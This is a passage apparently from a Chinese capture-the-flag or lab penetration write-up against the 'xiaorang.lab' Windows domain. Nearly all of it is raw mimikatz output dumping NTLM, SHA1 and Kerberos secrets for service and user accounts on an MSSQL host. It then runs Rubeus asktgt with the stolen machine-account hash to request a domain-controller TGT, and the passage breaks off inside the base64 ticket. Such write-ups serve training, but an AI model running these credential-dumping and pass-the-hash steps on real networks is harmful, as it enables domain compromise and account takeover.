 2e 82 ad 54 cd 75 dd c3 84 5e f9 36 a6 0b e9 c4 d1 50 21 20 db 6e 4a dc fb 5d 49 0d c0 52 f6 b9 e2 f8 3e 9b 35 b0 7b 87 5e 1d 46 52 6e dc 44
        ssp :
        credman :

Authentication Id : 0 ; 99528 (00000000:000184c8)
Session           : Service from 0
User Name         : MSSQLServerOLAPService
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 2025/6/23 18:40:30
SID               : S-1-5-80-2872255330-672591203-888807865-2791174282-1554802921
        msv :
         [00000003] Primary
         * Username : MSSQLSERVER$
         * Domain   : XIAORANG
         * NTLM     : e376abf07cfd9e4647e06d2b11084c91
         * SHA1     : be8008781b8c6f74c0ef0940255bc97779506080
        tspkg :
        wdigest :
         * Username : MSSQLSERVER$
         * Domain   : XIAORANG
         * Password : (null)
        kerberos :
         * Username : MSSQLSERVER$
         * Domain   : xiaorang.lab
         * Password : a6 4e b6 7b 3c ed 85 fc 87 3f d6 96 62 f7 d8 2c dd c8 d5 b2 21 15 1d bf 24 ee 38 dc 09 77 72 38 d4 df 51 4d ca f7 98 e3 a3 af 08
 4c bf 83 14 ee 0c f7 c3 35 68 5d 8c 7c 0c 0f 0b 75 f1 83 26 4c 2b b6 fa 80 3f af f5 9e 8e 72 b0 39 88 e9 06 98 9f 6b d7 4d 32 09 35 12 a8 48 9d 80 4c
 0b 6a c8 48 bb 0c 98 70 e6 0b 82 f4 c6 2c cf 4b 92 6d bb cd f3 ef f6 7a f5 22 aa 4e 89 27 a8 81 e2 5b 88 1e ab 58 94 c4 94 cd 94 7f 43 21 cc d4 1a 76
 0b ca 6d 0f f1 f8 b3 07 95 77 f8 7f ca 04 a6 a2 b7 1a 06 ec 03 c3 94 ad fc c7 48 4e 80 94 62 5f b5 85 52 aa f1 f8 bd f3 02 48 ce a2 6d ae e6 3c b0 01
 2e 82 ad 54 cd 75 dd c3 84 5e f9 36 a6 0b e9 c4 d1 50 21 20 db 6e 4a dc fb 5d 49 0d c0 52 f6 b9 e2 f8 3e 9b 35 b0 7b 87 5e 1d 46 52 6e dc 44
        ssp :
        credman :

Authentication Id : 0 ; 99370 (00000000:0001842a)
Session           : Service from 0
User Name         : MSSQLSERVER
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 2025/6/23 18:40:30
SID               : S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003
        msv :
         [00000003] Primary
         * Username : MSSQLSERVER$
         * Domain   : XIAORANG
         * NTLM     : e376abf07cfd9e4647e06d2b11084c91
         * SHA1     : be8008781b8c6f74c0ef0940255bc97779506080
        tspkg :
        wdigest :
         * Username : MSSQLSERVER$
         * Domain   : XIAORANG
         * Password : (null)
        kerberos :
         * Username : MSSQLSERVER$
         * Domain   : xiaorang.lab
         * Password : a6 4e b6 7b 3c ed 85 fc 87 3f d6 96 62 f7 d8 2c dd c8 d5 b2 21 15 1d bf 24 ee 38 dc 09 77 72 38 d4 df 51 4d ca f7 98 e3 a3 af 08
 4c bf 83 14 ee 0c f7 c3 35 68 5d 8c 7c 0c 0f 0b 75 f1 83 26 4c 2b b6 fa 80 3f af f5 9e 8e 72 b0 39 88 e9 06 98 9f 6b d7 4d 32 09 35 12 a8 48 9d 80 4c
 0b 6a c8 48 bb 0c 98 70 e6 0b 82 f4 c6 2c cf 4b 92 6d bb cd f3 ef f6 7a f5 22 aa 4e 89 27 a8 81 e2 5b 88 1e ab 58 94 c4 94 cd 94 7f 43 21 cc d4 1a 76
 0b ca 6d 0f f1 f8 b3 07 95 77 f8 7f ca 04 a6 a2 b7 1a 06 ec 03 c3 94 ad fc c7 48 4e 80 94 62 5f b5 85 52 aa f1 f8 bd f3 02 48 ce a2 6d ae e6 3c b0 01
 2e 82 ad 54 cd 75 dd c3 84 5e f9 36 a6 0b e9 c4 d1 50 21 20 db 6e 4a dc fb 5d 49 0d c0 52 f6 b9 e2 f8 3e 9b 35 b0 7b 87 5e 1d 46 52 6e dc 44
        ssp :
        credman :

Authentication Id : 0 ; 97203 (00000000:00017bb3)
Session           : Service from 0
User Name         : ReportServer
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 2025/6/23 18:40:30
SID               : S-1-5-80-2885764129-887777008-271615777-1616004480-2722851051
        msv :
         [00000003] Primary
         * Username : MSSQLSERVER$
         * Domain   : XIAORANG
         * NTLM     : e376abf07cfd9e4647e06d2b11084c91
         * SHA1     : be8008781b8c6f74c0ef0940255bc97779506080
        tspkg :
        wdigest :
         * Username : MSSQLSERVER$
         * Domain   : XIAORANG
         * Password : (null)
        kerberos :
         * Username : MSSQLSERVER$
         * Domain   : xiaorang.lab
         * Password : a6 4e b6 7b 3c ed 85 fc 87 3f d6 96 62 f7 d8 2c dd c8 d5 b2 21 15 1d bf 24 ee 38 dc 09 77 72 38 d4 df 51 4d ca f7 98 e3 a3 af 08
 4c bf 83 14 ee 0c f7 c3 35 68 5d 8c 7c 0c 0f 0b 75 f1 83 26 4c 2b b6 fa 80 3f af f5 9e 8e 72 b0 39 88 e9 06 98 9f 6b d7 4d 32 09 35 12 a8 48 9d 80 4c
 0b 6a c8 48 bb 0c 98 70 e6 0b 82 f4 c6 2c cf 4b 92 6d bb cd f3 ef f6 7a f5 22 aa 4e 89 27 a8 81 e2 5b 88 1e ab 58 94 c4 94 cd 94 7f 43 21 cc d4 1a 76
 0b ca 6d 0f f1 f8 b3 07 95 77 f8 7f ca 04 a6 a2 b7 1a 06 ec 03 c3 94 ad fc c7 48 4e 80 94 62 5f b5 85 52 aa f1 f8 bd f3 02 48 ce a2 6d ae e6 3c b0 01
 2e 82 ad 54 cd 75 dd c3 84 5e f9 36 a6 0b e9 c4 d1 50 21 20 db 6e 4a dc fb 5d 49 0d c0 52 f6 b9 e2 f8 3e 9b 35 b0 7b 87 5e 1d 46 52 6e dc 44
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : MSSQLSERVER$
Domain            : XIAORANG
Logon Server      : (null)
Logon Time        : 2025/6/23 18:40:28
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : MSSQLSERVER$
         * Domain   : XIAORANG
         * NTLM     : e376abf07cfd9e4647e06d2b11084c91
         * SHA1     : be8008781b8c6f74c0ef0940255bc97779506080
        tspkg :
        wdigest :
         * Username : MSSQLSERVER$
         * Domain   : XIAORANG
         * Password : (null)
        kerberos :
         * Username : mssqlserver$
         * Domain   : XIAORANG.LAB
         * Password : a6 4e b6 7b 3c ed 85 fc 87 3f d6 96 62 f7 d8 2c dd c8 d5 b2 21 15 1d bf 24 ee 38 dc 09 77 72 38 d4 df 51 4d ca f7 98 e3 a3 af 08
 4c bf 83 14 ee 0c f7 c3 35 68 5d 8c 7c 0c 0f 0b 75 f1 83 26 4c 2b b6 fa 80 3f af f5 9e 8e 72 b0 39 88 e9 06 98 9f 6b d7 4d 32 09 35 12 a8 48 9d 80 4c
 0b 6a c8 48 bb 0c 98 70 e6 0b 82 f4 c6 2c cf 4b 92 6d bb cd f3 ef f6 7a f5 22 aa 4e 89 27 a8 81 e2 5b 88 1e ab 58 94 c4 94 cd 94 7f 43 21 cc d4 1a 76
 0b ca 6d 0f f1 f8 b3 07 95 77 f8 7f ca 04 a6 a2 b7 1a 06 ec 03 c3 94 ad fc c7 48 4e 80 94 62 5f b5 85 52 aa f1 f8 bd f3 02 48 ce a2 6d ae e6 3c b0 01
 2e 82 ad 54 cd 75 dd c3 84 5e f9 36 a6 0b e9 c4 d1 50 21 20 db 6e 4a dc fb 5d 49 0d c0 52 f6 b9 e2 f8 3e 9b 35 b0 7b 87 5e 1d 46 52 6e dc 44
        ssp :
        credman :

Authentication Id : 0 ; 217500 (00000000:0003519c)
Session           : Interactive from 0
User Name         : MSSQLSERVER19
Domain            : MSSQLSERVER
Logon Server      : MSSQLSERVER
Logon Time        : 2025/6/23 18:40:44
SID               : S-1-5-21-1403470932-1755135066-2609122076-1022
        msv :
         [00000003] Primary
         * Username : MSSQLSERVER19
         * Domain   : MSSQLSERVER
         * NTLM     : 9ce3bb5769303e1258f792792310e33b
         * SHA1     : 1a2452c461d89c45f199454f59771f17423e72f9
        tspkg :
        wdigest :
         * Username : MSSQLSERVER19
         * Domain   : MSSQLSERVER
         * Password : (null)
        kerberos :
         * Username : MSSQLSERVER19
         * Domain   : MSSQLSERVER
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 217062 (00000000:00034fe6)
Session           : Interactive from 0
User Name         : MSSQLSERVER16
Domain            : MSSQLSERVER
Logon Server      : MSSQLSERVER
Logon Time        : 2025/6/23 18:40:44
SID               : S-1-5-21-1403470932-1755135066-2609122076-1019
        msv :
         [00000003] Primary
         * Username : MSSQLSERVER16
         * Domain   : MSSQLSERVER
         * NTLM     : 42c0eed1872923f6b60118d9711282a6
         * SHA1     : dcf14b63c01e9d5a9d4d9c25d1b2eb6c65c2e3a6
        tspkg :
        wdigest :
         * Username : MSSQLSERVER16
         * Domain   : MSSQLSERVER
         * Password : (null)
        kerberos :
         * Username : MSSQLSERVER16
         * Domain   : MSSQLSERVER
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 216980 (00000000:00034f94)
Session           : Interactive from 0
User Name         : MSSQLSERVER15
Domain            : MSSQLSERVER
Logon Server      : MSSQLSERVER
Logon Time        : 2025/6/23 18:40:44
SID               : S-1-5-21-1403470932-1755135066-2609122076-1018
        msv :
         [00000003] Primary
         * Username : MSSQLSERVER15
         * Domain   : MSSQLSERVER
         * NTLM     : 6eeb34930fa71d82a464ce235261effd
         * SHA1     : 1dfc6d66d9cfdbaa5fc091fedde9a3387771d09b
        tspkg :
        wdigest :
         * Username : MSSQLSERVER15
         * Domain   : MSSQLSERVER
         * Password : (null)
        kerberos :
         * Username : MSSQLSERVER15
         * Domain   : MSSQLSERVER
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 216898 (00000000:00034f42)
Session           : Interactive from 0
User Name         : MSSQLSERVER14
Domain            : MSSQLSERVER
Logon Server      : MSSQLSERVER
Logon Time        : 2025/6/23 18:40:44
SID               : S-1-5-21-1403470932-1755135066-2609122076-1017
        msv :
         [00000003] Primary
         * Username : MSSQLSERVER14
         * Domain   : MSSQLSERVER
         * NTLM     : 7c8553b614055d945f8b8c3cf8eae789
         * SHA1     : 1efdc2efed20ca503bdefea5aef8aa0ea04c257b
        tspkg :
        wdigest :
         * Username : MSSQLSERVER14
         * Domain   : MSSQLSERVER
         * Password : (null)
        kerberos :
         * Username : MSSQLSERVER14
         * Domain   : MSSQLSERVER
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 216817 (00000000:00034ef1)
Session           : Interactive from 0
User Name         : MSSQLSERVER13
Domain            : MSSQLSERVER
Logon Server      : MSSQLSERVER
Logon Time        : 2025/6/23 18:40:44
SID               : S-1-5-21-1403470932-1755135066-2609122076-1016
        msv :
         [00000003] Primary
         * Username : MSSQLSERVER13
         * Domain   : MSSQLSERVER
         * NTLM     : b808e9a53247721e84cc314c870080c5
         * SHA1     : 47a42f4a6eed2b2d90f342416f42e2696052f546
        tspkg :
        wdigest :
         * Username : MSSQLSERVER13
         * Domain   : MSSQLSERVER
         * Password : (null)
        kerberos :
         * Username : MSSQLSERVER13
         * Domain   : MSSQLSERVER
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 216735 (00000000:00034e9f)
Session           : Interactive from 0
User Name         : MSSQLSERVER12
Domain            : MSSQLSERVER
Logon Server      : MSSQLSERVER
Logon Time        : 2025/6/23 18:40:44
SID               : S-1-5-21-1403470932-1755135066-2609122076-1015
        msv :
         [00000003] Primary
         * Username : MSSQLSERVER12
         * Domain   : MSSQLSERVER
         * NTLM     : 672702a4bd7524269b77dbb6b2e75911
         * SHA1     : c7a828609e4912ab752b43deda8351dc1a8ea240
        tspkg :
        wdigest :
         * Username : MSSQLSERVER12
         * Domain   : MSSQLSERVER
         * Password : (null)
        kerberos :
         * Username : MSSQLSERVER12
         * Domain   : MSSQLSERVER
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 216653 (00000000:00034e4d)
Session           : Interactive from 0
User Name         : MSSQLSERVER11
Domain            : MSSQLSERVER
Logon Server      : MSSQLSERVER
Logon Time        : 2025/6/23 18:40:44
SID               : S-1-5-21-1403470932-1755135066-2609122076-1014
        msv :
         [00000003] Primary
         * Username : MSSQLSERVER11
         * Domain   : MSSQLSERVER
         * NTLM     : cee10216b2126aa1a3f239b8201120ef
         * SHA1     : 4867093fc519f7d1e91d80e3790ef8a17a7fdd18
        tspkg :
        wdigest :
         * Username : MSSQLSERVER11
         * Domain   : MSSQLSERVER
         * Password : (null)
        kerberos :
         * Username : MSSQLSERVER11
         * Domain   : MSSQLSERVER
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 216572 (00000000:00034dfc)
Session           : Interactive from 0
User Name         : MSSQLSERVER10
Domain            : MSSQLSERVER
Logon Server      : MSSQLSERVER
Logon Time        : 2025/6/23 18:40:44
SID               : S-1-5-21-1403470932-1755135066-2609122076-1013
        msv :
         [00000003] Primary
         * Username : MSSQLSERVER10
         * Domain   : MSSQLSERVER
         * NTLM     : c3e7aa593081ae1b210547da7d46819b
         * SHA1     : 3bf20cfece021438cf86617f5cabc5e7a69038f7
        tspkg :
        wdigest :
         * Username : MSSQLSERVER10
         * Domain   : MSSQLSERVER
         * Password : (null)
        kerberos :
         * Username : MSSQLSERVER10
         * Domain   : MSSQLSERVER
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 216490 (00000000:00034daa)
Session           : Interactive from 0
User Name         : MSSQLSERVER09
Domain            : MSSQLSERVER
Logon Server      : MSSQLSERVER
Logon Time        : 2025/6/23 18:40:44
SID               : S-1-5-21-1403470932-1755135066-2609122076-1012
        msv :
         [00000003] Primary
         * Username : MSSQLSERVER09
         * Domain   : MSSQLSERVER
         * NTLM     : 2dd7fe93426175a9ff3fa928bcf0eb77
         * SHA1     : a34c0482568fc9329f33ccdc1852fab9ef65bcd1
        tspkg :
        wdigest :
         * Username : MSSQLSERVER09
         * Domain   : MSSQLSERVER
         * Password : (null)
        kerberos :
         * Username : MSSQLSERVER09
         * Domain   : MSSQLSERVER
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 216408 (00000000:00034d58)
Session           : Interactive from 0
User Name         : MSSQLSERVER08
Domain            : MSSQLSERVER
Logon Server      : MSSQLSERVER
Logon Time        : 2025/6/23 18:40:44
SID               : S-1-5-21-1403470932-1755135066-2609122076-1011
        msv :
         [00000003] Primary
         * Username : MSSQLSERVER08
         * Domain   : MSSQLSERVER
         * NTLM     : 465034ebde60dfae889c3e493e1816bf
         * SHA1     : c96428917f7c8a15ea0370716dee153842afaf02
        tspkg :
        wdigest :
         * Username : MSSQLSERVER08
         * Domain   : MSSQLSERVER
         * Password : (null)
        kerberos :
         * Username : MSSQLSERVER08
         * Domain   : MSSQLSERVER
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 215812 (00000000:00034b04)
Session           : Interactive from 0
User Name         : MSSQLSERVER01
Domain            : MSSQLSERVER
Logon Server      : MSSQLSERVER
Logon Time        : 2025/6/23 18:40:44
SID               : S-1-5-21-1403470932-1755135066-2609122076-1004
        msv :
         [00000003] Primary
         * Username : MSSQLSERVER01
         * Domain   : MSSQLSERVER
         * NTLM     : ded5ad90b3d8560838a777039641c673
         * SHA1     : a2cd9d2963f29b162847e8a1a2c19d5e0641a162
        tspkg :
        wdigest :
         * Username : MSSQLSERVER01
         * Domain   : MSSQLSERVER
         * Password : (null)
        kerberos :
         * Username : MSSQLSERVER01
         * Domain   : MSSQLSERVER
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 186179 (00000000:0002d743)
Session           : Service from 0
User Name         : MSSQLFDLauncher
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 2025/6/23 18:40:39
SID               : S-1-5-80-3263513310-3392720605-1798839546-683002060-3227631582
        msv :
         [00000003] Primary
         * Username : MSSQLSERVER$
         * Domain   : XIAORANG
         * NTLM     : e376abf07cfd9e4647e06d2b11084c91
         * SHA1     : be8008781b8c6f74c0ef0940255bc97779506080
        tspkg :
        wdigest :
         * Username : MSSQLSERVER$
         * Domain   : XIAORANG
         * Password : (null)
        kerberos :
         * Username : MSSQLSERVER$
         * Domain   : xiaorang.lab
         * Password : a6 4e b6 7b 3c ed 85 fc 87 3f d6 96 62 f7 d8 2c dd c8 d5 b2 21 15 1d bf 24 ee 38 dc 09 77 72 38 d4 df 51 4d ca f7 98 e3 a3 af 08
 4c bf 83 14 ee 0c f7 c3 35 68 5d 8c 7c 0c 0f 0b 75 f1 83 26 4c 2b b6 fa 80 3f af f5 9e 8e 72 b0 39 88 e9 06 98 9f 6b d7 4d 32 09 35 12 a8 48 9d 80 4c
 0b 6a c8 48 bb 0c 98 70 e6 0b 82 f4 c6 2c cf 4b 92 6d bb cd f3 ef f6 7a f5 22 aa 4e 89 27 a8 81 e2 5b 88 1e ab 58 94 c4 94 cd 94 7f 43 21 cc d4 1a 76
 0b ca 6d 0f f1 f8 b3 07 95 77 f8 7f ca 04 a6 a2 b7 1a 06 ec 03 c3 94 ad fc c7 48 4e 80 94 62 5f b5 85 52 aa f1 f8 bd f3 02 48 ce a2 6d ae e6 3c b0 01
 2e 82 ad 54 cd 75 dd c3 84 5e f9 36 a6 0b e9 c4 d1 50 21 20 db 6e 4a dc fb 5d 49 0d c0 52 f6 b9 e2 f8 3e 9b 35 b0 7b 87 5e 1d 46 52 6e dc 44
        ssp :
        credman :

Authentication Id : 0 ; 184665 (00000000:0002d159)
Session           : Service from 0
User Name         : MSSQLLaunchpad
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 2025/6/23 18:40:39
SID               : S-1-5-80-3477044410-376262199-2110164357-2030828471-4165405235
        msv :
         [00000003] Primary
         * Username : MSSQLSERVER$
         * Domain   : XIAORANG
         * NTLM     : e376abf07cfd9e4647e06d2b11084c91
         * SHA1     : be8008781b8c6f74c0ef0940255bc97779506080
        tspkg :
        wdigest :
         * Username : MSSQLSERVER$
         * Domain   : XIAORANG
         * Password : (null)
        kerberos :
         * Username : MSSQLSERVER$
         * Domain   : xiaorang.lab
         * Password : a6 4e b6 7b 3c ed 85 fc 87 3f d6 96 62 f7 d8 2c dd c8 d5 b2 21 15 1d bf 24 ee 38 dc 09 77 72 38 d4 df 51 4d ca f7 98 e3 a3 af 08
 4c bf 83 14 ee 0c f7 c3 35 68 5d 8c 7c 0c 0f 0b 75 f1 83 26 4c 2b b6 fa 80 3f af f5 9e 8e 72 b0 39 88 e9 06 98 9f 6b d7 4d 32 09 35 12 a8 48 9d 80 4c
 0b 6a c8 48 bb 0c 98 70 e6 0b 82 f4 c6 2c cf 4b 92 6d bb cd f3 ef f6 7a f5 22 aa 4e 89 27 a8 81 e2 5b 88 1e ab 58 94 c4 94 cd 94 7f 43 21 cc d4 1a 76
 0b ca 6d 0f f1 f8 b3 07 95 77 f8 7f ca 04 a6 a2 b7 1a 06 ec 03 c3 94 ad fc c7 48 4e 80 94 62 5f b5 85 52 aa f1 f8 bd f3 02 48 ce a2 6d ae e6 3c b0 01
 2e 82 ad 54 cd 75 dd c3 84 5e f9 36 a6 0b e9 c4 d1 50 21 20 db 6e 4a dc fb 5d 49 0d c0 52 f6 b9 e2 f8 3e 9b 35 b0 7b 87 5e 1d 46 52 6e dc 44
        ssp :
        credman :

Authentication Id : 0 ; 98050 (00000000:00017f02)
Session           : Service from 0
User Name         : MsDtsServer130
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 2025/6/23 18:40:30
SID               : S-1-5-80-3763098489-2620711134-3767674660-4164406483-1621732
        msv :
         [00000003] Primary
         * Username : MSSQLSERVER$
         * Domain   : XIAORANG
         * NTLM     : e376abf07cfd9e4647e06d2b11084c91
         * SHA1     : be8008781b8c6f74c0ef0940255bc97779506080
        tspkg :
        wdigest :
         * Username : MSSQLSERVER$
         * Domain   : XIAORANG
         * Password : (null)
        kerberos :
         * Username : MSSQLSERVER$
         * Domain   : xiaorang.lab
         * Password : a6 4e b6 7b 3c ed 85 fc 87 3f d6 96 62 f7 d8 2c dd c8 d5 b2 21 15 1d bf 24 ee 38 dc 09 77 72 38 d4 df 51 4d ca f7 98 e3 a3 af 08
 4c bf 83 14 ee 0c f7 c3 35 68 5d 8c 7c 0c 0f 0b 75 f1 83 26 4c 2b b6 fa 80 3f af f5 9e 8e 72 b0 39 88 e9 06 98 9f 6b d7 4d 32 09 35 12 a8 48 9d 80 4c
 0b 6a c8 48 bb 0c 98 70 e6 0b 82 f4 c6 2c cf 4b 92 6d bb cd f3 ef f6 7a f5 22 aa 4e 89 27 a8 81 e2 5b 88 1e ab 58 94 c4 94 cd 94 7f 43 21 cc d4 1a 76
 0b ca 6d 0f f1 f8 b3 07 95 77 f8 7f ca 04 a6 a2 b7 1a 06 ec 03 c3 94 ad fc c7 48 4e 80 94 62 5f b5 85 52 aa f1 f8 bd f3 02 48 ce a2 6d ae e6 3c b0 01
 2e 82 ad 54 cd 75 dd c3 84 5e f9 36 a6 0b e9 c4 d1 50 21 20 db 6e 4a dc fb 5d 49 0d c0 52 f6 b9 e2 f8 3e 9b 35 b0 7b 87 5e 1d 46 52 6e dc 44
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2025/6/23 18:40:28
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 64188 (00000000:0000fabc)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2025/6/23 18:40:28
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : MSSQLSERVER$
         * Domain   : XIAORANG
         * NTLM     : cea3e66a2715c71423e7d3f0ff6cd352
         * SHA1     : 6de4e8f192569bbc44ae94f273870635ae878094
        tspkg :
        wdigest :
         * Username : MSSQLSERVER$
         * Domain   : XIAORANG
         * Password : (null)
        kerberos :
         * Username : MSSQLSERVER$
         * Domain   : xiaorang.lab
         * Password : (p4Spnv`&9xTZ=D'D/lz[a:94O:$E!7&zfcMza9k;Se"&>cBCBU0bxw.xL"B>\GmtUT,<:q3Yxfq#`O3sLI;OK" (_T_T5- $zV]-i;)c$qIj&$RgttdZI"m
        ssp :
        credman :

Authentication Id : 0 ; 64166 (00000000:0000faa6)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2025/6/23 18:40:28
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : MSSQLSERVER$
         * Domain   : XIAORANG
         * NTLM     : e376abf07cfd9e4647e06d2b11084c91
         * SHA1     : be8008781b8c6f74c0ef0940255bc97779506080
        tspkg :
        wdigest :
         * Username : MSSQLSERVER$
         * Domain   : XIAORANG
         * Password : (null)
        kerberos :
         * Username : MSSQLSERVER$
         * Domain   : xiaorang.lab
         * Password : a6 4e b6 7b 3c ed 85 fc 87 3f d6 96 62 f7 d8 2c dd c8 d5 b2 21 15 1d bf 24 ee 38 dc 09 77 72 38 d4 df 51 4d ca f7 98 e3 a3 af 08
 4c bf 83 14 ee 0c f7 c3 35 68 5d 8c 7c 0c 0f 0b 75 f1 83 26 4c 2b b6 fa 80 3f af f5 9e 8e 72 b0 39 88 e9 06 98 9f 6b d7 4d 32 09 35 12 a8 48 9d 80 4c
 0b 6a c8 48 bb 0c 98 70 e6 0b 82 f4 c6 2c cf 4b 92 6d bb cd f3 ef f6 7a f5 22 aa 4e 89 27 a8 81 e2 5b 88 1e ab 58 94 c4 94 cd 94 7f 43 21 cc d4 1a 76
 0b ca 6d 0f f1 f8 b3 07 95 77 f8 7f ca 04 a6 a2 b7 1a 06 ec 03 c3 94 ad fc c7 48 4e 80 94 62 5f b5 85 52 aa f1 f8 bd f3 02 48 ce a2 6d ae e6 3c b0 01
 2e 82 ad 54 cd 75 dd c3 84 5e f9 36 a6 0b e9 c4 d1 50 21 20 db 6e 4a dc fb 5d 49 0d c0 52 f6 b9 e2 f8 3e 9b 35 b0 7b 87 5e 1d 46 52 6e dc 44
        ssp :
        credman :

Authentication Id : 0 ; 23060 (00000000:00005a14)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2025/6/23 18:40:13
SID               :
        msv :
         [00000003] Primary
         * Username : MSSQLSERVER$
         * Domain   : XIAORANG
         * NTLM     : e376abf07cfd9e4647e06d2b11084c91
         * SHA1     : be8008781b8c6f74c0ef0940255bc97779506080
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : MSSQLSERVER$
Domain            : XIAORANG
Logon Server      : (null)
Logon Time        : 2025/6/23 18:40:13
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : MSSQLSERVER$
         * Domain   : XIAORANG
         * Password : (null)
        kerberos :
         * Username : mssqlserver$
         * Domain   : XIAORANG.LAB
         * Password : a6 4e b6 7b 3c ed 85 fc 87 3f d6 96 62 f7 d8 2c dd c8 d5 b2 21 15 1d bf 24 ee 38 dc 09 77 72 38 d4 df 51 4d ca f7 98 e3 a3 af 08
 4c bf 83 14 ee 0c f7 c3 35 68 5d 8c 7c 0c 0f 0b 75 f1 83 26 4c 2b b6 fa 80 3f af f5 9e 8e 72 b0 39 88 e9 06 98 9f 6b d7 4d 32 09 35 12 a8 48 9d 80 4c
 0b 6a c8 48 bb 0c 98 70 e6 0b 82 f4 c6 2c cf 4b 92 6d bb cd f3 ef f6 7a f5 22 aa 4e 89 27 a8 81 e2 5b 88 1e ab 58 94 c4 94 cd 94 7f 43 21 cc d4 1a 76
 0b ca 6d 0f f1 f8 b3 07 95 77 f8 7f ca 04 a6 a2 b7 1a 06 ec 03 c3 94 ad fc c7 48 4e 80 94 62 5f b5 85 52 aa f1 f8 bd f3 02 48 ce a2 6d ae e6 3c b0 01
 2e 82 ad 54 cd 75 dd c3 84 5e f9 36 a6 0b e9 c4 d1 50 21 20 db 6e 4a dc fb 5d 49 0d c0 52 f6 b9 e2 f8 3e 9b 35 b0 7b 87 5e 1d 46 52 6e dc 44
        ssp :
        credman :

mimikatz(commandline) # exit
Bye!
```
`e376abf07cfd9e4647e06d2b11084c91`主要抓这个mssql机器账户的hash。
这里尝试传Rubeus上去用S4U请求域控获取tgt，但是一直没有反应。然后翻到一个博客说是.net版本问题，最后找到了这个
> https://blog.q1ngchuan.top/2024/08/20/%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Brute4Road/index.html
> https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe
```powershell
C:\Users\MSSQLSERVER\Desktop>.\Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:e376abf07cfd9e4647e06d2b11084c91 /domain:xiaorang.lab /dc:DC.xiaorang.lab /no
wrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGT

[*] Using rc4_hmac hash: e376abf07cfd9e4647e06d2b11084c91
[*] Building AS-REQ (w/ preauth) for: 'xiaorang.lab\MSSQLSERVER$'
[*] Using domain controller: 172.22.2.3:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgEC
ooIEUQSCBE1s4kH1SAYlZNzxVVJWLtQ651L66C3sv0Xrv0FuCk2VDPXO9r72HhyuCWtPZPuk9PqNFfbfxyZYgSv+NZPIjVg7ruxP6eNk2U6WKcYSfVu5rirX5twZeHpx0klX9plmqZbeYZjFjpHli6
PIU0oELGiocXgalA9yWW/uHh4dHkl/7X2q70++yUnTR5yuJACBVnMAE3oxhraliFpDF/lRrRvuaZzPN3GpV1YFoiXMYRI6R/VgGNC/EwesuF62lHL2/TL84GYLt8Cn97p1VHNy+/vL36nji1FGGSui
nnivER4EfOLQU1yJFegRh06LiY/KVG6Vlg84bP32ezab1FNTY4p5yV1oc0YUsgL0Z3nt0gmFuxlC2dsjgpI4qLmJweDrmMi3G2HdSeDfqip2vciAQnpbiGawQy/arp66A6IzyXOggTKdFEUE7bzi0U
Ky02+W7FlqjmxQcCXlLLYGvXNHJ1M5d5PEBBcmXPdO+Z30HTBajeSADN9CiNQxanppQuwq+VAuODcVjJltJ/rpVdifCze+Y1PSJSpz5Xq8+h1hUboypRkY53dWPwobJOlCK3Xs080yyFMMUsrial6F
BgJihKbGeY3KhxySuuWWOrA1JGfWNFAojJNae/go8iPuGb7T6rqTG4Xm58zXR3cMGdQR1ybOETQ/poHd8M7zKxBtH0wWBZei3+f9qR6xM67mhyaGzcp53/hYkHm/ODR+DFF0Eo358wM9FI8SHlYe9L
wRfFnQAD5g6hBoha0n/u89fbzyn3piZh8KiAbqEj4ItIX9xkwf4sazYGAMRB24dfsuIUB9zayx3beVdiWTNCBwkDftH9bzV6qprF1GOXWhIVwxyIw7CPANWzmRCaEhZFucNN4ja22nWL1HhpVAFHcy
